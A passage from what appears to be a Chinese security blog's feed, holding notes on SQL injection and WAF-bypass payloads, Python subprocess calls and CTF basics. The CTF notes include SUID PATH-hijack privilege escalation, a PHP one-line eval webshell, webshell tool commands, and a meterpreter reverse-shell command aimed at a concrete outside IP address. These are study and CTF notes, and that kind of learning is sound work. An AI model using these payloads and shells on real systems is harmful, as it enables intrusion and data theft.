title="SQL注入和SQL盲注有何差别？"></a><strong>SQL注入和SQL盲注有何差别？</strong></h3><p>在常规的SQL注入中，应用返回数据库中的数据并呈现给你，而在SQL盲注漏洞中，你只能获取分别与注入中的真假条件相对应的两个不同响应，应用会针对真假条件返回不同的值，但是攻击者无法检索查询结果。</p><h3 id="什么是引发SQL注入漏洞的主要原因？"><a href="#什么是引发SQL注入漏洞的主要原因？" class="headerlink" title="什么是引发SQL注入漏洞的主要原因？"></a><strong>什么是引发SQL注入漏洞的主要原因？</strong></h3><p>Web应用未对用户提供的数据进行充分审查和未对输出进行编码是产生问题的主要原因。</p><h3 id="什么是堆叠查询（stacked-query）？"><a href="#什么是堆叠查询（stacked-query）？" class="headerlink" title="什么是堆叠查询（stacked query）？"></a><strong>什么是堆叠查询（stacked query）？</strong></h3><p>在单个数据库连接中，执行多个查询序列，是否允许堆叠查询是影响能否利用SQL注入漏洞的重要因素之一。</p><p>在MYSQL中，<code>SELECT * FROM members; DROP members;</code>是可以执行的，数据库是肯定支持堆叠查询的，但是让php来执行堆叠查询的sql语句就不一定行了。</p><h3 id="是啥意思？"><a href="#是啥意思？" class="headerlink" title="**/*! ... */**是啥意思？"></a>**<code>/*! ... */</code>**<strong>是啥意思？</strong></h3><p>MYSQL数据库特有，如果在注释的开头部分添加一个感叹号并在后面跟上数据库版本编号，那么该注释将被解析成代码，只要数据库版本高于或者等于注释中包含的版本，代码就会被执行。</p><p><code>select 1 /!40119 + 1/</code></p><p>该查询结果：</p><blockquote><p>返回2(MySQL版本为4.01.19或者更高)</p><p>返回1（其他情况）</p></blockquote><h3 id="如果注入语句中的‘-’被过滤？"><a href="#如果注入语句中的‘-’被过滤？" class="headerlink" title="如果注入语句中的‘=’被过滤？"></a><strong>如果注入语句中的‘=’被过滤？</strong></h3><p>可以考虑使用like关键字替换：<code>union select password from users where username like admin；</code></p><h3 id="如果空格被过滤？可以考虑使用‘-’替换："><a href="#如果空格被过滤？可以考虑使用‘-’替换：" class="headerlink" title="如果空格被过滤？可以考虑使用‘/**/’替换："></a><strong>如果空格被过滤？可以考虑使用‘/**/’替换：</strong></h3><p><code>union/**/select/**/password/**/from/**/users/**/where/**/username/**/like/**/admin；</code></p><p>注意，如果过滤了关键字，在MySQL中，还可以在关键字内部使用内联注释来绕过：</p><p><code>uni//on//sel//ect//password//fr//om//users//wh//ere//username//like//admin；</code></p><h3 id="SQL注入中的‘-’？"><a href="#SQL注入中的‘-’？" class="headerlink" title="SQL注入中的‘+’？"></a><strong>SQL注入中的‘+’？</strong></h3><p>MSSQL：在MSSQL中，“+”运算符被用于字符串连接和加法运算，‘1’+‘1’=‘11’，1+1=2；</p><p>MySQL：在MySQL中，“+”运算符只被用于加法运算，‘1’+‘1’=‘2’，1+1=2；</p><p>Oracle：在Oracle中，“+”运算符只被用于加法运算，‘1’+‘1’=‘2’，1+1=2。</p><h3 id="数据库中字符串的连接符？"><a href="#数据库中字符串的连接符？" class="headerlink" title="数据库中字符串的连接符？"></a><strong>数据库中字符串的连接符？</strong></h3><p>MSSQL：‘a’+‘b’=‘ab’</p><p>MYSQL：‘a’ ‘b’=‘ab’</p><p>Oracle：‘a’||‘b’=‘ab’</p><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a><strong>注释符</strong></h3><p>MSSQL：‘– ’(注意后面的空格)，‘<code>/.../</code>’</p><p>MySQL：‘– ’,‘# ’,‘<code>/.../</code>’，注意，–后面必须要有一个或者多个空格。</p><p>Oracle：‘– ’,‘<code>/.../</code>’</p><p>三种数据库中，通用的注释符是‘– ’</p><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a><strong>WAF绕过</strong></h2><h3 id="规则层面的绕过"><a href="#规则层面的绕过" class="headerlink" title="规则层面的绕过"></a>规则层面的绕过</h3><h4 id="SQL注释符绕过"><a href="#SQL注释符绕过" class="headerlink" title="SQL注释符绕过"></a><strong>SQL注释符绕过</strong></h4><p><code>union/**/select</code></p><p><code>union/aaaa%01bbs/select</code></p><p><code>union/aaaaaaaaaaaaaaaaaaaaaaaaaaaa/select</code></p><p>内连注释：<code>/!xxxx/</code></p><h4 id="空白符号绕过："><a href="#空白符号绕过：" class="headerlink" title="空白符号绕过："></a><strong>空白符号绕过：</strong></h4><p>MySQL空白符：%90,%0A,%0B,%0D,%20,%0C,%A0,/xxx/</p><p>正则的空白符：%09,%0A,%0B,%0D,%20</p><p>Example-1：union%250Cselect</p><p>Example-1：union%25A0select</p><h4 id="函数分隔符号："><a href="#函数分隔符号：" class="headerlink" title="函数分隔符号："></a><strong>函数分隔符号：</strong></h4><p>concat%2520(</p><p>concat/**/(</p><p>concat%250c(</p><p>concat%25a0(</p><h4 id="浮点数词法分析："><a href="#浮点数词法分析：" class="headerlink" title="浮点数词法分析："></a><strong>浮点数词法分析：</strong></h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8E0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span></span><span class="line"><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span></span><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">8.0</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span></span><span class="line"><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span></span><span class="line"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span>\Nunion <span class="hljs-keyword">select</span></span><span class="line"><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span></span></code></pre></div></div><h4 id="利用error-based进行SQL注入"><a href="#利用error-based进行SQL注入" class="headerlink" title="利用error_based进行SQL注入:"></a><strong>利用error_based进行SQL注入:</strong></h4><p>Error-based SQL注入函数非常容易被忽略</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line">extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5c</span>,md5(<span class="hljs-number">3</span>)));</span><span class="line"></br></span><span class="line">updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x5d</span>,md5(<span class="hljs-number">3</span>)),<span class="hljs-number">1</span>);</span><span class="line"></br></span><span class="line">GeometryCollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span></span><span class="line"></br></span><span class="line">(<span class="hljs-keyword">select</span>@<span class="hljs-variable">@version</span>)f)x))</span><span class="line"></br></span><span class="line">polygon((<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">1</span>))x))</span><span class="line"></br></span><span class="line">linestring()</span><span class="line"></br></span><span class="line">multipoint()</span><span class="line"></br></span><span class="line">multilinestring()</span><span class="line"></br></span><span class="line">multipolygon()</span></code></pre></div></div><h4 id="MySQL特殊语法"><a href="#MySQL特殊语法" class="headerlink" title="MySQL特殊语法"></a><strong>MySQL特殊语法</strong></h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-sql codeBlockLines"><span class="line"><span class="hljs-keyword">select</span>&#123;x table_name&#125;<span class="hljs-keyword">from</span>&#123;x information_schema.tables&#125;;</span></code></pre></div></div><h4 id="每一个点都能找到绕过的方法"><a href="#每一个点都能找到绕过的方法" class="headerlink" title="每一个点都能找到绕过的方法"></a><strong>每一个点都能找到绕过的方法</strong></h4><p>以注释绕过为例子，开始Fuzz</p><p>注释符绕过:</p><ul><li><p>先测试最基本的: <code>union/**/select</code></p></li><li><p>再测试中间引入特殊字：<code>union/aaaa%01bbs/select</code></p></li><li><p>最后测试注释长度：<code>union/aaaaaaaaaaaaaaaaaaaaaaa/select</code></p></li></ul><p>最基本的模式：</p><p><code>union/something/select</code></p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a><strong>大小写绕过</strong></h4><p>如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只对整体进行过滤。</p><p>例如：and过滤。当然这种过滤只是发现关键字出现，并不会对关键字处理。可以通过修改关键字的内字母大小写来绕过过滤措施。</p><h3 id="常规绕过手段"><a href="#常规绕过手段" class="headerlink" title="常规绕过手段"></a><strong>常规绕过手段</strong></h3><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a><strong>双写绕过</strong></h4><p>如果在程序中设置出现关键字之后替换为空，那么SQl注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。因为在过滤过程中只进行了一次替换。</p><p>例如：过滤了union 只要发现union 无论大小写都会被替换为空。这是就可以通过双写uniunionon的写法来对过滤进行绕过。</p><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a><strong>编码绕过</strong></h4><p>可以利用网络中的URl在线编码，绕过SQL注入的过滤机制。</p><p><a href="http://tool.chinaz.com/Tools/urlencode.aspx">http://tool.chinaz.com/Tools/urlencode.aspx</a> </p><h4 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a><strong>内联注释绕过</strong></h4><p>在Mysql中内容注释中的内容可以被当做SQL语句执行。</p><h4 id="绕过过滤and和or的SQL注入"><a href="#绕过过滤and和or的SQL注入" class="headerlink" title="绕过过滤and和or的SQL注入"></a><strong>绕过过滤and和or的SQL注入</strong></h4><p>Mysql一些特性：</p><ol><li><p>Mysql中的大小写不敏感，大写和小写一样。</p></li><li><p>Mysql中的十六进制与URL编码。</p></li><li><p>符号和关键字替换 and –&gt; &amp;&amp;、or –&gt; ||</p></li><li><p>内联注释与多行注释 /!内联注释/ /多行注释/。</p></li><li><p>Mysql中会自动识别URL与Hex编码好的内容。</p></li></ol><p><strong>绕过策略：</strong></p><ol><li><p>大小写变形，or,OR,oR,Or,and,And,AND,aND等。</p></li><li><p>在这两个敏感词汇中添加注释，例如：<code>a/**/and</code> 双写：<code>oorr</code></p></li><li><p>利用符号替代 and–&gt;&amp;&amp;、or–&gt;||</p></li></ol><h4 id="绕过去除空格的SQL注入"><a href="#绕过去除空格的SQL注入" class="headerlink" title="绕过去除空格的SQL注入"></a><strong>绕过去除空格的SQL注入</strong></h4><p>编码：hex,urlencode</p><p>空格URL编码：</p><p>%0a 新建一行</p><p>%0c 新的一页</p><p>%0d return功能</p><p>%0b TAB键（垂直）</p><p>Sqlmap安全检测：</p><p>sqlmap -u “URL” –hex –dbs –batch</p><h4 id="绕过去除（union和select）的SQL注入"><a href="#绕过去除（union和select）的SQL注入" class="headerlink" title="绕过去除（union和select）的SQL注入"></a><strong>绕过去除（union和select）的SQL注入</strong></h4><p>编码<code>%0a</code>、加入<code>/**/</code>符，union/select大小写、双写等绕过。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 调用执行Shell命令</title>
      <link href="/2022/02/10/Python-%E8%B0%83%E7%94%A8%E6%89%A7%E8%A1%8CShell%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/02/10/Python-%E8%B0%83%E7%94%A8%E6%89%A7%E8%A1%8CShell%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="os-system"><a href="#os-system" class="headerlink" title="os.system"></a>os.system</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">os.system(cmd)</span></code></pre></div></div><p>可以直接使用Shell命令，并回显。</p><h2 id="subprocess"><a href="#subprocess" class="headerlink" title="subprocess"></a>subprocess</h2><p><code>subprocess</code>模块允许启动一个新的进程，并连接到输入/输出/错误管道，从而获取返回值。</p><p>常用的方法有</p><ul><li><code>run</code><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line">subprocess.<span class="hljs-builtin-name">run</span>(args, *, <span class="hljs-attribute">stdin</span>=None, <span class="hljs-attribute">input</span>=None, <span class="hljs-attribute">stdout</span>=None, <span class="hljs-attribute">stderr</span>=None, <span class="hljs-attribute">capture_output</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">shell</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">cwd</span>=None, <span class="hljs-attribute">timeout</span>=None, <span class="hljs-attribute">check</span>=<span class="hljs-literal">False</span>, <span class="hljs-attribute">encoding</span>=None, <span class="hljs-attribute">errors</span>=None, <span class="hljs-attribute">text</span>=None, <span class="hljs-attribute">env</span>=None, <span class="hljs-attribute">universal_newlines</span>=None)</span></code></pre></div></div></li></ul><p>其中<code>args</code>必须使用数组的方式，所以经常使用<code>shlex.split()</code>来切割命令</p><p>例如：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shlex.split(<span class="hljs-string">&quot;tmux new-session -s TireFire_&#123;&#125; -n Main -c &#123;&#125; -d&quot;</span>.<span class="hljs-built_in">format</span>(hostname, cwd)))</span></code></pre></div></div><p>此时只是启动一个新进程执行，并没有捕获输出</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shell.split(<span class="hljs-string">&quot;ls -la&quot;</span>), capture_output=<span class="hljs-literal">True</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)</span></code></pre></div></div><p>这样就可以再返回值里面获得<code>stdout</code>了</p><p>更简单的方式是使用<code>subprocess.getoutput</code></p><ul><li><code>getoutput</code><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.getoutput(cmd)</span></code></pre></div></div></li></ul><p>例子:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">uid = subprocess.getoutput(<span class="hljs-string">&quot;id -u&quot;</span>)</span><span class="line"><span class="hljs-keyword">if</span> uid != <span class="hljs-string">&quot;0&quot;</span>:</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;must be run with root permissions&quot;</span>)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 基础知识点</title>
      <link href="/2021/12/31/CTF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2021/12/31/CTF-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="训练站点"><a href="#训练站点" class="headerlink" title="训练站点"></a>训练站点</h2><p><a href="https://blog.csdn.net/Fly_hps/article/details/79783253">推荐规划</a></p><ul><li><a href="https://www.ichunqiu.com/battalion">i春秋训练平台</a></li><li><a href="http://www.wechall.net/sites.php">We Chall</a> 国外收集的CTF平台</li><li><a href="https://microcorruption.com/login">很炫酷游戏化</a></li></ul><h2 id="系统-Exploit"><a href="#系统-Exploit" class="headerlink" title="系统 Exploit"></a>系统 Exploit</h2><h3 id="Linux-Exploit"><a href="#Linux-Exploit" class="headerlink" title="Linux Exploit"></a>Linux Exploit</h3><h3 id="C编译"><a href="#C编译" class="headerlink" title="C编译"></a>C编译</h3><p>应当不用保护</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-llvm codeBlockLines"><span class="line">gcc <span class="hljs-number">1</span>.<span class="hljs-keyword">c</span> -o <span class="hljs-number">1</span> -O<span class="hljs-number">0</span> -fno-stack-protector -z execstack <span class="hljs-number">1</span>.<span class="hljs-keyword">c</span> -o <span class="hljs-number">1</span></span><span class="line"></br></span><span class="line">-m<span class="hljs-number">32</span>： <span class="hljs-number">32</span>bit 编译</span></code></pre></div></div><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul><li><a href="https://www.freebuf.com/articles/system/173903.html">参考</a>这篇文章</li></ul><h4 id="查看可使用的执行文件"><a href="#查看可使用的执行文件" class="headerlink" title="查看可使用的执行文件"></a>查看可使用的执行文件</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line"><span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type  f 2 &gt;/dev/<span class="hljs-literal">null</span></span></code></pre></div></div><p>通过这个命令查看哪些文件可以被现在的用户使用，并找到提权方法。</p><h4 id="修改变量攻击"><a href="#修改变量攻击" class="headerlink" title="修改变量攻击"></a>修改变量攻击</h4><p>思路是找到<code>s</code>权限的执行文件，这个执行文件包括调用了更高级别的命令。<br>那么就可以通过修改其中的命令的调用地址来达到目的</p><p>比如<code>flag01</code>使用到了<code>ps</code>命令</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span> &gt; /tmp/<span class="hljs-built_in">ps</span></span><span class="line"><span class="hljs-variable">$</span> chmod <span class="hljs-number">777</span> /tmp/<span class="hljs-built_in">ps</span></span><span class="line"><span class="hljs-variable">$</span> export PATH=/tmp:<span class="hljs-variable">$PATH</span></span><span class="line"><span class="hljs-variable">$</span> ./flag01</span></code></pre></div></div><h4 id="system-任意命令攻击"><a href="#system-任意命令攻击" class="headerlink" title="system() 任意命令攻击"></a>system() 任意命令攻击</h4><p>原理是使用print系函数向<code>buff</code>中写入了可选字符串，然后通过<code>system()</code>运行</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-cpp codeBlockLines"><span class="line"><span class="hljs-built_in">asprintf</span>(&amp;buffer, <span class="hljs-string">&quot;/bin/echo %s is cool&quot;</span>, <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;USER&quot;</span>));</span><span class="line"><span class="hljs-built_in">system</span>(buffer);</span></code></pre></div></div><p>上例中就将<code>getenv(&#39;USER&#39;)</code>作为变量输入，利用方法就是修改环境变量达到任意命令的写入</p><h3 id="Windows-Exploit"><a href="#Windows-Exploit" class="headerlink" title="Windows Exploit"></a>Windows Exploit</h3><h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul><li><a href="https://xz.aliyun.com/t/2519">总结文章</a></li></ul><h3 id="字节序（小端机和大端机）"><a href="#字节序（小端机和大端机）" class="headerlink" title="字节序（小端机和大端机）"></a>字节序（小端机和大端机）</h3><p>一般来说，WIndows和Linux都是使用的小端机模式。<br>而网络传输使用的是大端机</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> struct</span><span class="line">struct.pack(<span class="hljs-string">&#x27;&lt;i&#x27;</span>, <span class="hljs-number">0x01020304</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># &lt; 是小端模式</span></span><span class="line"><span class="hljs-comment"># i 是整数型</span></span></code></pre></div></div><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><p>大部分因为都是Linux下面的题目，所以下面写的默认为Linux操作</p><h3 id="静态工具"><a href="#静态工具" class="headerlink" title="静态工具"></a>静态工具</h3><h4 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h4><ol><li>将整个文件反汇编Dump下来</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-angelscript codeBlockLines"><span class="line">objdump -d -M <span class="hljs-built_in">int</span>el &lt;file_name&gt; &gt; dump.asm</span></code></pre></div></div><ol start="2"><li>获取 got 表</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">objdump -R <span class="hljs-tag">&lt;<span class="hljs-name">file_name</span>&gt;</span></span></code></pre></div></div><h4 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h4><p>用于查找文件中的字符串</p><h4 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h4><p>用于查看动态链接库</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>查看文件类型</p><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>查看保护状态</p><h4 id="十六进制编辑"><a href="#十六进制编辑" class="headerlink" title="十六进制编辑"></a>十六进制编辑</h4><p><code>hexeditor -b &lt;file&gt;</code></p><ul><li><code>ctrl + i</code> 十六进制和文本切换</li><li><code>ctrl + a</code> 插入</li><li><code>ctrl + d</code> 删除</li><li><code>ctrl + o</code> 保存</li></ul><h3 id="动态调试工具"><a href="#动态调试工具" class="headerlink" title="动态调试工具"></a>动态调试工具</h3><p><a href="https://x64dbg.com/#start">X64dbg</a></p><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><p>当看到其中包含大量的加密字段，不要怀疑是否需要解密，直接找找字符串，看是什么壳</p><h4 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h4><ul><li>upx 这样的经典壳可以自动脱壳</li></ul><p><code>upx -d &lt;file&gt;</code></p><h3 id="其他类型题目"><a href="#其他类型题目" class="headerlink" title="其他类型题目"></a>其他类型题目</h3><h4 id="数独"><a href="#数独" class="headerlink" title="数独"></a>数独</h4><p>要做数独，一定会给出基础数字以及体积关系，比如<code>9*9</code>大小的各个数存在内存中。</p><p>所以解题逻辑就是找到申请的内存，然后再找到初始化的数值。<br>最后通过<a href="https://shudu.gwalker.cn/">在线网站</a>解出答案<br>提交的flag原始数据替换为0，因为提交的答案是要验证的。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="对图片的验证"><a href="#对图片的验证" class="headerlink" title="对图片的验证"></a>对图片的验证</h3><p>使用的是google开源的图片识别系统<code>pytesseract</code><br>对图像的打开使用的是<code>PIL</code> <a href="https://www.cnblogs.com/wei-li/archive/2012/04/19/2443281.html">Python Image Library</a></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> pytesseract</span><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><span class="line"></br></span><span class="line">img = Image.<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;code.png&#x27;</span>)</span><span class="line"><span class="hljs-type">text</span> = pytesseract.image_to_string(img)</span></code></pre></div></div><h3 id="上传-webshell"><a href="#上传-webshell" class="headerlink" title="上传 webshell"></a>上传 webshell</h3><h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>基本型</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-php codeBlockLines"><span class="line"><span class="hljs-meta">&lt;?php</span></span><span class="line">  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="line"><span class="hljs-meta">?&gt;</span></span></code></pre></div></div><h5 id="变体"><a href="#变体" class="headerlink" title="变体"></a>变体</h5><p><a href="http://www.secist.com/archives/1947.html">这里</a>是变形体的总结</p><ol><li>修改脚本语言标签</li></ol><p><code>&lt;?php ?&gt;</code> 为 <code>&lt;script language=&quot;PHP&quot;&gt; &lt;/script&gt;</code></p><p>注意为<code>&quot;</code></p><h4 id="webshell-工具"><a href="#webshell-工具" class="headerlink" title="webshell 工具"></a>webshell 工具</h4><h5 id="CKnife"><a href="#CKnife" class="headerlink" title="CKnife"></a>CKnife</h5><p>这里是跨平台CKnife的 <a href="https://github.com/Chora10/Cknife">Github</a> 地址</p><h5 id="webcaoo"><a href="#webcaoo" class="headerlink" title="webcaoo"></a>webcaoo</h5><ul><li><p>生成</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-css codeBlockLines"><span class="line">webacoo -g -o <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span></span></code></pre></div></div></li><li><p>连接</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">webacoo -t -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span></span></code></pre></div></div></li></ul><h5 id="weevely"><a href="#weevely" class="headerlink" title="weevely"></a>weevely</h5><ul><li>生成</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-verilog codeBlockLines"><span class="line">weevely <span class="hljs-keyword">generate</span> &lt;password&gt; &lt;path&gt;</span></code></pre></div></div><ul><li>连接</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xml codeBlockLines"><span class="line">weevely <span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span> [cmd]</span></code></pre></div></div><ul><li>常用命令<div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-elixir codeBlockLines"><span class="line"><span class="hljs-symbol">:system_info</span> 收集系统基本信息</span><span class="line"><span class="hljs-symbol">:audit_filesystem</span> 查找系统文件中的弱权限</span><span class="line"><span class="hljs-symbol">:audit_suidsgid</span> 查找有使用高级权限的文件</span><span class="line"><span class="hljs-symbol">:shell_sh</span> 执行SHELL命令</span><span class="line"><span class="hljs-symbol">:backdoor_meterpreter</span> 通过meterpreter连接</span><span class="line">&gt; backdoor_meterpreter -payload linux/x64/meterpreter/reverse_tcp -host <span class="hljs-number">144.34</span>.<span class="hljs-number">215.199</span> -port <span class="hljs-number">4444</span></span><span class="line">&gt; msfconsole(LHOST <span class="hljs-number">127.0</span>.0.<span class="hljs-number">1</span>)</span><span class="line"><span class="hljs-symbol">:file_download</span> 下载文件</span><span class="line"><span class="hljs-symbol">:sql_console</span> sql交互</span><span class="line"><span class="hljs-symbol">:sql_dump</span> 脱库</span><span class="line"><span class="hljs-symbol">:net_scan</span> 网络扫描</span></code></pre></div></div></li></ul><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><ol><li>在<code>phpinfo()</code>中<code>allow_url_include</code>处于开启状态，意味着可以使用<code>RAW_POST</code>提交数据</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">&lt;url&gt;?path=php://input</span><span class="line"></br></span><span class="line">post:</span><span class="line">&lt;?php system(<span class="hljs-string">&#x27;ls&#x27;</span>); ?&gt;</span></code></pre></div></div><ol start="2"><li>文件的写入除了<code>fwrite()</code> 还有**<code>file_put_contents</code>**</li></ol><p><code>file_put_contents</code>除了<code>string</code>还支持数组。</p><p>所以可以像<code>data[]=&lt;?php eval() ?&gt;</code>这样，通过数组绕过正则检测。</p><ol start="3"><li>限制上传</li></ol><p>当出现限制上传的时候，应该首先考虑是否有<code>javascript</code>脚本或者通过修改<code>Content-Type</code>类型来达到绕过的目的。、</p><h2 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span></code></pre></div></div><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-attr">c</span> = remote(ip, port)</span></code></pre></div></div><h3 id="发送和接收"><a href="#发送和接收" class="headerlink" title="发送和接收"></a>发送和接收</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-autoit codeBlockLines"><span class="line"><span class="hljs-built_in">send</span>(payload) <span class="hljs-meta"># 发送payload</span></span><span class="line">sendline(payload)  <span class="hljs-meta"># 发送payload, 已\n换行</span></span><span class="line">sendafter(some_string, payload) <span class="hljs-meta"># 接受到some_string后发送payload</span></span><span class="line"></br></span><span class="line">recvn(n) <span class="hljs-meta"># 接受N（数字）字符</span></span><span class="line">recvline() <span class="hljs-meta">#接受一行输出</span></span><span class="line">recvlines(n) <span class="hljs-meta"># 接收N行输出</span></span><span class="line">recvuntil(some_string) <span class="hljs-meta"># 接收到 some_string 为止</span></span></code></pre></div></div><h3 id="转码"><a 